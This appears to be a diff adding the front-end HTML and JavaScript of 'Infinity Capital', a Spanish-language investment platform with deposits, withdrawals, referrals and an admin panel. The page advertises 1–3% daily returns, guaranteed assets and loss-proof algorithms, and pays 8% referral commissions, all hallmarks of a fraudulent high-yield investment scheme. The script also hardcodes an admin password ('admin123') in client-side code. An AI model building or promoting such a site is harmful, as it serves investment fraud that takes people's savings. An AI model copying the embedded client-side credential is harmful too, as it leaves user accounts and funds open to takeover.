+                        <button class="main-btn" id="referralEarningsBtn">
+                            <i class="fas fa-users"></i> Referidos
+                            <div class="btn-amount">RD$ <span id="referralAmount">0.00</span></div>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="container">
+            <!-- SECCIÓN INICIO (activa por defecto) - SOLO TRADINGVIEW -->
+            <section id="inicio" class="section active">
+                <div class="panel">
+                    <h2><i class="fas fa-chart-line"></i> Mercados en Tiempo Real</h2>
+                    <!-- WIDGET DE TRADINGVIEW -->
+                    <div class="tradingview-widget-container">
+                        <div id="tradingview_chart" style="height:100%; width:100%"></div>
+                        <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                        <script type="text/javascript">
+                            new TradingView.widget({
+                                "autosize": true,
+                                "symbol": "BINANCE:BTCUSDT",
+                                "interval": "D",
+                                "timezone": "Etc/UTC",
+                                "theme": "light",
+                                "style": "1",
+                                "locale": "es",
+                                "toolbar_bg": "#f1f3f6",
+                                "enable_publishing": false,
+                                "allow_symbol_change": true,
+                                "container_id": "tradingview_chart"
+                            });
+                        </script>
+                    </div>
+                </div>
+
+                <!-- CONTADORES REGRESIVOS PARA CADA INVERSIÓN -->
+                <div id="countersContainer" class="counters-container">
+                    <!-- Los contadores se generarán dinámicamente aquí -->
+                </div>
+            </section>
+
+            <!-- SECCIÓN INVERSIÓN -->
+            <section id="inversion" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-chart-pie"></i> Planes de Inversión</h2>
+                    <div class="investment-plans">
+                        <div class="plan">
+                            <h3>Nivel 1</h3>
+                            <div class="rate">1% Diario</div>
+                            <div class="range">Inversión: RD$ 1,000 - 100,000</div>
+                            <p>Ideal para inversores principiantes. Ganancias estables con bajo riesgo.</p>
+                            <button class="btn invest-btn" data-plan="1" data-amount="1000">Invertir</button>
+                        </div>
+                        <div class="plan">
+                            <h3>Nivel 2</h3>
+                            <div class="rate">2% Diario</div>
+                            <div class="range">Inversión: RD$ 100,000 - 500,000</div>
+                            <p>Para inversores experimentados. Mayor rentabilidad con riesgo moderado.</p>
+                            <button class="btn invest-btn" data-plan="2" data-amount="100000">Invertir</button>
+                        </div>
+                        <div class="plan">
+                            <h3>Nivel 3</h3>
+                            <div class="rate">3% Diario</div>
+                            <div class="range">Inversión: RD$ 500,000+</div>
+                            <p>Máxima rentabilidad para grandes capitales. Estrategias avanzadas.</p>
+                            <button class="btn invest-btn" data-plan="3" data-amount="500000">Invertir</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECCIÓN MI INFORMACIÓN -->
+            <section id="miinformacion" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-id-card"></i> Mi Información</h2>
+                    
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <label>Correo Electrónico:</label>
+                            <p id="userEmail">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Teléfono:</label>
+                            <p id="userPhone">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Cédula de Identidad:</label>
+                            <p id="userCedula">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Fecha de Registro:</label>
+                            <p id="userRegDate">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Saldo Actual:</label>
+                            <p>RD$ <span id="userBalance">0.00</span></p>
+                        </div>
+                        <div class="info-item">
+                            <label>Ganancias Totales:</label>
+                            <p>RD$ <span id="userEarnings">0.00</span></p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECCIÓN INVERSIONES REALIZADAS -->
+            <section id="inversionesrealizadas" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-history"></i> Inversiones Realizadas</h2>
+                    
+                    <div id="investmentHistory" class="investment-history">
+                        <!-- Las inversiones se mostrarán aquí dinámicamente -->
+                        <p id="noInvestmentsMessage">Aún no has realizado inversiones.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECCIÓN MIS REFERIDOS -->
+            <section id="misreferidos" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-user-friends"></i> Mis Referidos</h2>
+                    
+                    <!-- Enlace de referidos -->
+                    <h3 style="margin-top: 30px;"><i class="fas fa-user-plus"></i> Enlace de Referidos</h3>
+                    <p>Gana 8% por cada inversión de tus referidos</p>
+                    <div class="referral-link">
+                        <input type="text" id="referralLink" value="" readonly>
+                        <button class="copy-btn" id="copyReferralBtn">Copiar</button>
+                    </div>
+                    <p style="font-size: 14px; color: #666;">Comparte este enlace para ganar comisiones por cada inversión de tus referidos</p>
+                    
+                    <!-- Lista de referidos -->
+                    <h3 style="margin-top: 30px;"><i class="fas fa-users"></i> Lista de Referidos</h3>
+                    <div id="referralsList">
+                        <p id="noReferralsMessage">Aún no tienes referidos que hayan invertido.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECCIÓN ESTADO DE SOLICITUDES -->
+            <section id="estado" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-tasks"></i> Estado de Solicitudes</h2>
+                    
+                    <h3 style="margin-top: 20px;">Solicitudes de Recarga</h3>
+                    <div id="rechargeRequestsList">
+                        <p id="noRechargeRequests">No tienes solicitudes de recarga pendientes.</p>
+                    </div>
+                    
+                    <h3 style="margin-top: 30px;">Solicitudes de Retiro</h3>
+                    <div id="withdrawRequestsList">
+                        <p id="noWithdrawRequests">No tienes solicitudes de retiro pendientes.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECCIÓN NOSOTROS -->
+            <section id="nosotros" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-info-circle"></i> Sobre Nosotros</h2>
+                    <p>Infinity Capital es una empresa líder en el sector de inversiones financieras, con más de 10 años de experiencia en los mercados globales. Nuestro equipo está compuesto por analistas financieros, traders profesionales y expertos en economía.</p>
+                    
+                    <p>Nos especializamos en la <strong>compra en la bolsa de valores, activos garantizados</strong> y trabajando arduamente con <strong>algoritmos diseñados para no realizar pérdidas</strong>, por lo que se garantiza su efectividad por ser de larga duración.</p>
+                    
+                    <p>Nuestra misión es democratizar el acceso a las oportunidades de inversión en los mercados financieros, brindando herramientas y asesoramiento de calidad tanto para inversores noveles como experimentados.</p>
+                    
+                    <p>Utilizamos tecnologías avanzadas y estrategias probadas para maximizar los retornos de nuestros clientes mientras mantenemos un enfoque en la seguridad del capital.</p>
+                </div>
+            </section>
+
+            <!-- SECCIÓN NOTICIAS -->
+            <section id="noticias" class="section">
+                <div class="panel">
+                    <h2><i class="fas fa-newspaper"></i> Noticias de la Bolsa 2025</h2>
+                    
+                    <div class="news-item">
+                        <h3>Inteligencia Artificial revoluciona el análisis bursátil</h3>
+                        <p>Los sistemas de IA están transformando la forma en que se analizan los mercados financieros, permitiendo predicciones más precisas y estrategias de inversión optimizadas.</p>
+                        <span class="news-date">15 de marzo, 2025</span>
+                    </div>
+                    
+                    <div class="news-item">
+                        <h3>Nuevas regulaciones impulsan transparencia en criptomonedas</h3>
+                        <p>Los organismos reguladores internacionales han establecido nuevas directrices para garantizar la transparencia y seguridad en las operaciones con criptoactivos.</p>
+                        <span class="news-date">3 de febrero, 2025</span>
+                    </div>
+                    
+                    <div class="news-item">
+                        <h3>Mercados emergentes muestran crecimiento récord</h3>
+                        <p>Las economías de países en desarrollo están experimentando un crecimiento sin precedentes, ofreciendo nuevas oportunidades de inversión para capitales internacionales.</p>
+                        <span class="news-date">20 de enero, 2025</span>
+                    </div>
+                    
+                    <div class="news-item">
+                        <h3>Tecnologías verdes lideran inversiones sostenibles</h3>
+                        <p>Las empresas dedicadas a energías renovables y tecnologías ambientales continúan atrayendo importantes flujos de capital de inversionistas conscientes.</p>
+                        <span class="news-date">5 de enero, 2025</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <footer>
+            <div class="container">
+                <p>&copy; 2023 Infinity Capital. Todos los derechos reservados.</p>
+                <p>Inversiones sujetas a riesgos. Por favor lea nuestros términos y condiciones antes de invertir.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyD1PniZck7SLGx5rRZtKV6zh8N1lUvsmHo",
+            authDomain: "trading-ai-dubai-v2.firebaseapp.com",
+            projectId: "trading-ai-dubai-v2",
+            storageBucket: "trading-ai-dubai-v2.appspot.com",
+            messagingSenderId: "724546207955",
+            appId: "1:724546207955:web:1b99920463bf5264e05426"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // Elementos DOM
+        const registerScreen = document.getElementById('registerScreen');
+        const loginScreen = document.getElementById('loginScreen');
+        const mainScreen = document.getElementById('mainScreen');
+        const welcomeNotification = document.getElementById('welcomeNotification');
+        const registerForm = document.getElementById('registerForm');
+        const loginForm = document.getElementById('loginForm');
+        const goToLogin = document.getElementById('goToLogin');
+        const goToRegister = document.getElementById('goToRegister');
+        const closeNotification = document.getElementById('closeNotification');
+        const sections = document.querySelectorAll('.section');
+        
+        // Elementos del menú lateral
+        const sidebar = document.getElementById('sidebar');
+        const menuToggle = document.getElementById('menuToggle');
+        const closeSidebar = document.getElementById('closeSidebar');
+        const sidebarLinks = document.querySelectorAll('.sidebar a');
+        const logoutBtn = document.getElementById('logoutBtn');
+        
+        // Botones del menú
+        const rechargeBtnMenu = document.getElementById('rechargeBtnMenu');
+        const withdrawBtnMenu = document.getElementById('withdrawBtnMenu');
+        
+        // Elementos de recarga
+        const rechargeModal = document.getElementById('rechargeModal');
+        const closeRechargeModal = document.getElementById('closeRechargeModal');
+        const showCryptoOptions = document.getElementById('showCryptoOptions');
+        const showBankOptions = document.getElementById('showBankOptions');
+        const cryptoOptions = document.getElementById('cryptoOptions');
+        const bankOptions = document.getElementById('bankOptions');
+        const cryptoWalletInfo = document.getElementById('cryptoWalletInfo');
+        const bankAccountInfo = document.getElementById('bankAccountInfo');
+        const cryptoWalletAddress = document.getElementById('cryptoWalletAddress');
+        const copyCryptoWallet = document.getElementById('copyCryptoWallet');
+        const cryptoAmount = document.getElementById('cryptoAmount');
+        const submitCryptoPayment = document.getElementById('submitCryptoPayment');
+        const bankAccountNumber = document.getElementById('bankAccountNumber');
+        const copyBankAccount = document.getElementById('copyBankAccount');
+        const bankAmount = document.getElementById('bankAmount');
+        const submitBankPayment = document.getElementById('submitBankPayment');
+        
+        // Elementos de retiro
+        const withdrawModal = document.getElementById('withdrawModal');
+        const closeWithdrawModal = document.getElementById('closeWithdrawModal');
+        const showWithdrawCrypto = document.getElementById('showWithdrawCrypto');
+        const showWithdrawBank = document.getElementById('showWithdrawBank');
+        const withdrawCryptoOptions = document.getElementById('withdrawCryptoOptions');
+        const withdrawBankOptions = document.getElementById('withdrawBankOptions');
+        const withdrawCryptoInfo = document.getElementById('withdrawCryptoInfo');
+        const withdrawBankInfo = document.getElementById('withdrawBankInfo');
+        const withdrawCryptoWallet = document.getElementById('withdrawCryptoWallet');
+        const withdrawCryptoAmount = document.getElementById('withdrawCryptoAmount');
+        const submitWithdrawCrypto = document.getElementById('submitWithdrawCrypto');
+        const withdrawBankAccount = document.getElementById('withdrawBankAccount');
+        const withdrawBankAmount = document.getElementById('withdrawBankAmount');
+        const submitWithdrawBank = document.getElementById('submitWithdrawBank');
+        
+        // Otros elementos
+        const countersContainer = document.getElementById('countersContainer');
+        const copyReferralBtn = document.getElementById('copyReferralBtn');
+        const referralLink = document.getElementById('referralLink');
+        const investButtons = document.querySelectorAll('.invest-btn');
+        const investmentHistory = document.getElementById('investmentHistory');
+        const noInvestmentsMessage = document.getElementById('noInvestmentsMessage');
+        const referralsList = document.getElementById('referralsList');
+        const noReferralsMessage = document.getElementById('noReferralsMessage');
+        
+        // Elementos de estado de solicitudes
+        const rechargeRequestsList = document.getElementById('rechargeRequestsList');
+        const noRechargeRequests = document.getElementById('noRechargeRequests');
+        const withdrawRequestsList = document.getElementById('withdrawRequestsList');
+        const noWithdrawRequests = document.getElementById('noWithdrawRequests');
+
+        // Elementos de información personal
+        const userEmail = document.getElementById('userEmail');
+        const userPhone = document.getElementById('userPhone');
+        const userCedula = document.getElementById('userCedula');
+        const userRegDate = document.getElementById('userRegDate');
+        const userBalance = document.getElementById('userBalance');
+        const userEarnings = document.getElementById('userEarnings');
+
+        // Elementos de cantidades en botones
+        const balanceAmount = document.getElementById('balanceAmount');
+        const earningsAmount = document.getElementById('earningsAmount');
+        const referralAmount = document.getElementById('referralAmount');
+
+        // Elementos de administración
+        const adminIcon = document.getElementById('adminIcon');
+        const adminPanel = document.getElementById('adminPanel');
+        const closeAdminPanel = document.getElementById('closeAdminPanel');
+        const adminTabs = document.querySelectorAll('.admin-tab');
+        const adminUsersTable = document.getElementById('adminUsersTable');
+        const adminRechargeTable = document.getElementById('adminRechargeTable');
+        const adminWithdrawTable = document.getElementById('adminWithdrawTable');
+        const adminEarningsTable = document.getElementById('adminEarningsTable');
+        const adminReferralsTable = document.getElementById('adminReferralsTable');
+
+        // Botones de selección múltiple
+        const approveSelectedUsers = document.getElementById('approveSelectedUsers');
+        const deleteSelectedUsers = document.getElementById('deleteSelectedUsers');
+        const approveSelectedRecharges = document.getElementById('approveSelectedRecharges');
+        const rejectSelectedRecharges = document.getElementById('rejectSelectedRecharges');
+        const approveSelectedWithdraws = document.getElementById('approveSelectedWithdraws');
+        const rejectSelectedWithdraws = document.getElementById('rejectSelectedWithdraws');
+        const approveSelectedEarnings = document.getElementById('approveSelectedEarnings');
+        const rejectSelectedEarnings = document.getElementById('rejectSelectedEarnings');
+        const approveSelectedReferrals = document.getElementById('approveSelectedReferrals');
+        const rejectSelectedReferrals = document.getElementById('rejectSelectedReferrals');
+
+        // Checkboxes de selección múltiple
+        const selectAllUsers = document.getElementById('selectAllUsers');
+        const selectAllRecharges = document.getElementById('selectAllRecharges');
+        const selectAllWithdraws = document.getElementById('selectAllWithdraws');
+        const selectAllEarnings = document.getElementById('selectAllEarnings');
+        const selectAllReferrals = document.getElementById('selectAllReferrals');
+
+        // Variables de estado
+        let currentUser = null;
+        let activeInvestments = [];
+        let investmentCounters = {};
+        let adminPassword = "admin123"; // Contraseña de administrador
+        
+        // Wallets de criptomonedas
+        const cryptoWallets = {
+            "USDT BEP20": "0x8a3aF6f0F8D1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D",
+            "USDT TRC20": "TXYZ1234567890abcdefghijklmnopqrstuvwxyz",
+            "LTC": "LXYZ1234567890abcdefghijklmnopqrstuvwxyz",
+            "BNB": "bnb1234567890abcdefghijklmnopqrstuvwxyz",
+            "TRX": "TXYZ1234567890abcdefghijklmnopqrstuvwxyz"
+        };
+        
+        // Cuentas bancarias
+        const bankAccounts = {
+            "Banco Reserva": "123-456789-0",
+            "Banco Popular": "987-654321-0", 
+            "Banco BHD": "456-123789-0"
+        };
+
+        // Navegación entre registro y login
+        goToLogin.addEventListener('click', function(e) {
+            e.preventDefault();
+            registerScreen.style.display = 'none';
+            loginScreen.style.display = 'flex';
+        });
+
+        goToRegister.addEventListener('click', function(e) {
+            e.preventDefault();
+            loginScreen.style.display = 'none';
+            registerScreen.style.display = 'flex';
+        });
+
+        // Registro de usuario
+        registerForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('regEmail').value;
+            const phone = document.getElementById('regPhone').value;
+            const cedula = document.getElementById('regCedula').value;
+            const password = document.getElementById('regPassword').value;
+            
+            // Crear usuario en Firebase Auth
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    
+                    // Crear perfil de usuario en Firestore
+                    return db.collection('users').doc(user.uid).set({
+                        uid: user.uid,
+                        email: email,
+                        phone: phone,
+                        cedula: cedula,
+                        balance: 0,
+                        earnings: 0,
+                        referralEarnings: 0,
+                        status: "pending",
+                        registrationDate: new Date().toISOString(),
+                        investments: [],
+                        referrals: [],
+                        rechargeRequests: [],
+                        withdrawRequests: [],
+                        pendingEarnings: [],
+                        pendingReferrals: [],
+                        referralCode: generateReferralCode()
+                    });
+                })
+                .then(() => {
+                    alert('Registro exitoso. Ahora puede iniciar sesión.');
+                    registerScreen.style.display = 'none';
+                    loginScreen.style.display = 'flex';
+                    registerForm.reset();
+                })
+                .catch((error) => {
+                    console.error("Error en registro:", error);
+                    alert('Error en el registro: ' + error.message);
+                });
+        });
+
+        // Inicio de sesión
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    
+                    // Obtener datos del usuario desde Firestore
+                    return db.collection('users').doc(user.uid).get();
+                })
+                .then((doc) => {
+                    if (doc.exists) {
+                        currentUser = { uid: doc.id, ...doc.data() };
+                        loginScreen.style.display = 'none';
+                        welcomeNotification.style.display = 'flex';
+                        
+                        // Actualizar información personal
+                        updatePersonalInfo();
+                    } else {
+                        alert('No se encontraron datos del usuario.');
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error en inicio de sesión:", error);
+                    alert('Error en el inicio de sesión: ' + error.message);
+                });
+        });
+
+        // Cerrar notificación de bienvenida
+        closeNotification.addEventListener('click', function() {
+            welcomeNotification.style.display = 'none';
+            mainScreen.style.display = 'block';
+            updateAmountsDisplay();
+            updateReferralsList();
+            updateRequestsStatus();
+            
+            // Mostrar elementos solo para usuarios autenticados
+            menuToggle.classList.add('visible');
+            adminIcon.classList.add('visible');
+        });
+
+        // Menú lateral - Abrir
+        menuToggle.addEventListener('click', function() {
+            sidebar.classList.add('open');
+            mainScreen.classList.add('sidebar-open');
+        });
+
+        // Menú lateral - Cerrar
+        closeSidebar.addEventListener('click', function() {
+            sidebar.classList.remove('open');
+            mainScreen.classList.remove('sidebar-open');
+        });
+
+        // Navegación desde el menú lateral
+        sidebarLinks.forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetSection = this.getAttribute('data-section');
+                
+                if (targetSection) {
+                    // Ocultar todas las secciones
+                    sections.forEach(section => {
+                        section.classList.remove('active');
+                    });
+                    
+                    // Mostrar la sección seleccionada
+                    document.getElementById(targetSection).classList.add('active');
+                    
+                    // Actualizar información según la sección
+                    if (targetSection === 'miinformacion') {
+                        updatePersonalInfo();
+                    } else if (targetSection === 'inversionesrealizadas') {
+                        updateInvestmentHistory();
+                    } else if (targetSection === 'misreferidos') {
+                        updateReferralsList();
+                    } else if (targetSection === 'estado') {
+                        updateRequestsStatus();
+                    }
+                }
+                
+                // Cerrar el menú lateral
+                sidebar.classList.remove('open');
+                mainScreen.classList.remove('sidebar-open');
+            });
+        });
+
+        // Botones del menú lateral para recargar y retirar
+        rechargeBtnMenu.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('currentBalance').textContent = currentUser.balance.toFixed(2);
+            rechargeModal.style.display = 'flex';
+            resetRechargeModal();
+            
+            // Cerrar el menú lateral
+            sidebar.classList.remove('open');
+            mainScreen.classList.remove('sidebar-open');
+        });
+
+        withdrawBtnMenu.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('availableWithdraw').textContent = currentUser.balance.toFixed(2);
+            withdrawModal.style.display = 'flex';
+            resetWithdrawModal();
+            
+            // Cerrar el menú lateral
+            sidebar.classList.remove('open');
+            mainScreen.classList.remove('sidebar-open');
+        });
+
+        // Cerrar sesión
+        logoutBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (confirm('¿Está seguro de que desea cerrar sesión?')) {
+                auth.signOut().then(() => {
+                    // Limpiar datos del usuario
+                    currentUser = null;
+                    activeInvestments = [];
+                    
+                    // Detener todos los contadores
+                    Object.values(investmentCounters).forEach(interval => {
+                        clearInterval(interval);
+                    });
+                    investmentCounters = {};
+                    
+                    // Limpiar contadores
+                    countersContainer.innerHTML = '';
+                    
+                    // Ocultar elementos de usuario autenticado
+                    menuToggle.classList.remove('visible');
+                    adminIcon.classList.remove('visible');
+                    
+                    // Redirigir a la pantalla de inicio de sesión
+                    mainScreen.style.display = 'none';
+                    loginScreen.style.display = 'flex';
+                    
+                    // Cerrar menú lateral
+                    sidebar.classList.remove('open');
+                    mainScreen.classList.remove('sidebar-open');
+                }).catch((error) => {
+                    console.error("Error al cerrar sesión:", error);
+                });
+            }
+        });
+
+        // Sistema de Recarga - Criptomonedas
+        showCryptoOptions.addEventListener('click', function() {
+            cryptoOptions.style.display = 'block';
+            bankOptions.style.display = 'none';
+            
+            // Agregar event listeners a las opciones de criptomonedas
+            document.querySelectorAll('.crypto-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover clase active de todas las opciones
+                    document.querySelectorAll('.crypto-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    
+                    // Agregar clase active a la opción seleccionada
+                    this.classList.add('active');
+                    
+                    // Mostrar información de wallet
+                    const crypto = this.getAttribute('data-crypto');
+                    cryptoWalletAddress.value = cryptoWallets[crypto];
+                    cryptoWalletInfo.style.display = 'block';
+                });
+            });
+        });
+
+        // Sistema de Recarga - Bancos
+        showBankOptions.addEventListener('click', function() {
+            bankOptions.style.display = 'block';
+            cryptoOptions.style.display = 'none';
+            
+            // Agregar event listeners a las opciones de bancos
+            document.querySelectorAll('.bank-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover clase active de todas las opciones
+                    document.querySelectorAll('.bank-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    
+                    // Agregar clase active a la opción seleccionada
+                    this.classList.add('active');
+                    
+                    // Mostrar información de cuenta bancaria
+                    const bank = this.getAttribute('data-bank');
+                    bankAccountNumber.value = bankAccounts[bank];
+                    bankAccountInfo.style.display = 'block';
+                });
+            });
+        });
+
+        // Copiar wallet de criptomonedas
+        copyCryptoWallet.addEventListener('click', function() {
+            cryptoWalletAddress.select();
+            document.execCommand('copy');
+            alert('Wallet copiada al portapapeles');
+        });
+
+        // Copiar cuenta bancaria
+        copyBankAccount.addEventListener('click', function() {
+            bankAccountNumber.select();
+            document.execCommand('copy');
+            alert('Número de cuenta copiado al portapapeles');
+        });
+
+        // Enviar pago con criptomonedas
+        submitCryptoPayment.addEventListener('click', function() {
+            const amount = parseFloat(cryptoAmount.value);
+            const selectedCrypto = document.querySelector('.crypto-option.active');
+            
+            if (!selectedCrypto) {
+                alert('Por favor selecciona una criptomoneda');
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert('Por favor ingresa un monto válido');
+                return;
+            }
+            
+            const crypto = selectedCrypto.getAttribute('data-crypto');
+            const wallet = cryptoWallets[crypto];
+            
+            // Crear solicitud de recarga
+            const rechargeRequest = {
+                id: Date.now().toString(),
+                type: 'crypto',
+                crypto: crypto,
+                wallet: wallet,
+                amount: amount,
+                status: 'pending',
+                date: new Date().toISOString()
+            };
+            
+            // Guardar en Firestore
+            db.collection('users').doc(currentUser.uid).update({
+                rechargeRequests: firebase.firestore.FieldValue.arrayUnion(rechargeRequest)
+            })
+            .then(() => {
+                alert('Solicitud de recarga enviada. Estará pendiente hasta ser aprobada por el administrador.');
+                rechargeModal.style.display = 'none';
+                resetRechargeModal();
+                updateRequestsStatus();
+            })
+            .catch((error) => {
+                console.error("Error al enviar solicitud de recarga:", error);
+                alert('Error al enviar la solicitud: ' + error.message);
+            });
+        });
+
+        // Enviar pago con banco
+        submitBankPayment.addEventListener('click', function() {
+            const amount = parseFloat(bankAmount.value);
+            const selectedBank = document.querySelector('.bank-option.active');
+            
+            if (!selectedBank) {
+                alert('Por favor selecciona un banco');
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert('Por favor ingresa un monto válido');
+                return;
+            }
+            
+            const bank = selectedBank.getAttribute('data-bank');
+            const account = bankAccounts[bank];
+            
+            // Crear solicitud de recarga
+            const rechargeRequest = {
+                id: Date.now().toString(),
+                type: 'bank',
+                bank: bank,
+                account: account,
+                amount: amount,
+                status: 'pending',
+                date: new Date().toISOString()
+            };
+            
+            // Guardar en Firestore
+            db.collection('users').doc(currentUser.uid).update({
+                rechargeRequests: firebase.firestore.FieldValue.arrayUnion(rechargeRequest)
+            })
+            .then(() => {
+                alert('Solicitud de recarga enviada. Estará pendiente hasta ser aprobada por el administrador.');
+                rechargeModal.style.display = 'none';
+                resetRechargeModal();
+                updateRequestsStatus();
+            })
+            .catch((error) => {
+                console.error("Error al enviar solicitud de recarga:", error);
+                alert('Error al enviar la solicitud: ' + error.message);
+            });
+        });
+
+        // Sistema de Retiro - Criptomonedas
+        showWithdrawCrypto.addEventListener('click', function() {
+            withdrawCryptoOptions.style.display = 'block';
+            withdrawBankOptions.style.display = 'none';
+            
+            // Agregar event listeners a las opciones de criptomonedas
+            document.querySelectorAll('#withdrawCryptoOptions .crypto-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover clase active de todas las opciones
+                    document.querySelectorAll('#withdrawCryptoOptions .crypto-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    
+                    // Agregar clase active a la opción seleccionada
+                    this.classList.add('active');
+                    
+                    // Mostrar información de wallet para retiro
+                    withdrawCryptoInfo.style.display = 'block';
+                });
+            });
+        });
+
+        // Sistema de Retiro - Bancos
+        showWithdrawBank.addEventListener('click', function() {
+            withdrawBankOptions.style.display = 'block';
+            withdrawCryptoOptions.style.display = 'none';
+            
+            // Agregar event listeners a las opciones de bancos
+            document.querySelectorAll('#withdrawBankOptions .bank-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover clase active de todas las opciones
+                    document.querySelectorAll('#withdrawBankOptions .bank-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    
+                    // Agregar clase active a la opción seleccionada
+                    this.classList.add('active');
+                    
+                    // Mostrar información de cuenta para retiro
+                    withdrawBankInfo.style.display = 'block';
+                });
+            });
+        });
+
+        // Enviar retiro con criptomonedas
+        submitWithdrawCrypto.addEventListener('click', function() {
+            const amount = parseFloat(withdrawCryptoAmount.value);
+            const wallet = withdrawCryptoWallet.value;
+            const selectedCrypto = document.querySelector('#withdrawCryptoOptions .crypto-option.active');
+            
+            if (!selectedCrypto) {
+                alert('Por favor selecciona una criptomoneda');
+                return;
+            }
+            
+            if (!wallet) {
+                alert('Por favor ingresa tu dirección de wallet');
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert('Por favor ingresa un monto válido');
+                return;
+            }
+            
+            if (amount > currentUser.balance) {
+                alert('Saldo insuficiente para realizar este retiro');
+                return;
+            }
+            
+            const crypto = selectedCrypto.getAttribute('data-crypto');
+            
+            // Crear solicitud de retiro
+            const withdrawRequest = {
+                id: Date.now().toString(),
+                type: 'crypto',
+                crypto: crypto,
+                wallet: wallet,
+                amount: amount,
+                status: 'pending',
+                date: new Date().toISOString()
+            };
+            
+            // Guardar en Firestore
+            db.collection('users').doc(currentUser.uid).update({
+                withdrawRequests: firebase.firestore.FieldValue.arrayUnion(withdrawRequest)
+            })
+            .then(() => {
+                alert('Solicitud de retiro enviada. Estará pendiente hasta ser aprobada por el administrador.');
+                withdrawModal.style.display = 'none';
+                resetWithdrawModal();
+                updateRequestsStatus();
+            })
+            .catch((error) => {
+                console.error("Error al enviar solicitud de retiro:", error);
+                alert('Error al enviar la solicitud: ' + error.message);
+            });
+        });
+
+        // Enviar retiro con banco
+        submitWithdrawBank.addEventListener('click', function() {
+            const amount = parseFloat(withdrawBankAmount.value);
+            const account = withdrawBankAccount.value;
+            const selectedBank = document.querySelector('#withdrawBankOptions .bank-option.active');
+            
+            if (!selectedBank) {
+                alert('Por favor selecciona un banco');
+                return;
+            }
+            
+            if (!account) {
+                alert('Por favor ingresa tu número de cuenta');
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert('Por favor ingresa un monto válido');
+                return;
+            }
+            
+            if (amount > currentUser.balance) {
+                alert('Saldo insuficiente para realizar este retiro');
+                return;
+            }
+            
+            const bank = selectedBank.getAttribute('data-bank');
+            
+            // Crear solicitud de retiro
+            const withdrawRequest = {
+                id: Date.now().toString(),
+                type: 'bank',
+                bank: bank,
+                account: account,
+                amount: amount,
+                status: 'pending',
+                date: new Date().toISOString()
+            };
+            
+            // Guardar en Firestore
+            db.collection('users').doc(currentUser.uid).update({
+                withdrawRequests: firebase.firestore.FieldValue.arrayUnion(withdrawRequest)
+            })
+            .then(() => {
+                alert('Solicitud de retiro enviada. Estará pendiente hasta ser aprobada por el administrador.');
+                withdrawModal.style.display = 'none';
+                resetWithdrawModal();
+                updateRequestsStatus();
+            })
+            .catch((error) => {
+                console.error("Error al enviar solicitud de retiro:", error);
+                alert('Error al enviar la solicitud: ' + error.message);
+            });
+        });
+
+        // Resetear modal de recarga
+        function resetRechargeModal() {
+            cryptoOptions.style.display = 'none';
+            bankOptions.style.display = 'none';
+            cryptoWalletInfo.style.display = 'none';
+            bankAccountInfo.style.display = 'none';
+            cryptoAmount.value = '';
+            bankAmount.value = '';
+            
+            // Remover clases active
+            document.querySelectorAll('.crypto-option').forEach(opt => {
+                opt.classList.remove('active');
+            });
+            document.querySelectorAll('.bank-option').forEach(opt => {
+                opt.classList.remove('active');
+            });
+        }
+
+        // Resetear modal de retiro
+        function resetWithdrawModal() {
+            withdrawCryptoOptions.style.display = 'none';
+            withdrawBankOptions.style.display = 'none';
+            withdrawCryptoInfo.style.display = 'none';
+            withdrawBankInfo.style.display = 'none';
+            withdrawCryptoAmount.value = '';
+            withdrawBankAmount.value = '';
+            withdrawCryptoWallet.value = '';
+            withdrawBankAccount.value = '';
+            
+            // Remover clases active
+            document.querySelectorAll('#withdrawCryptoOptions .crypto-option').forEach(opt => {
+                opt.classList.remove('active');
+            });
+            document.querySelectorAll('#withdrawBankOptions .bank-option').forEach(opt => {
+                opt.classList.remove('active');
+            });
+        }
